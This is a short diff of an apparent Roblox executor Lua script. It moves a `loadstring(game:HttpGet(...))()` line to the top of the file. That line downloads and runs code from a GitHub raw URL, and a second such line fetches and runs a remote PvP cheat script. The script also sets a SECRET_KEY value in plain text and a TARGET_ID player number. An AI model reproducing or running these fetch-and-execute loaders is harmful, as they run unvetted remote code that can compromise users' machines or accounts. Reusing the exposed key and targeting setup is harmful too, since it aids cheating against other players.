@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AuraXDScripts/PulseHub/refs/heads/main/Premium"))()
 getgenv().SECRET_KEY = "mrr_e7393ea1f67b40b8b27ee4082ad3ea0f"
 getgenv().TARGET_ID = 2015830385
 getgenv().DELAY_STEP = 5     
@@ -210,4 +211,4 @@ end)
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Po21123/pvp-Aurahub/main/%22BestPvp%22"))()
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AuraXDScripts/PulseHub/refs/heads/main/Premium"))()
+
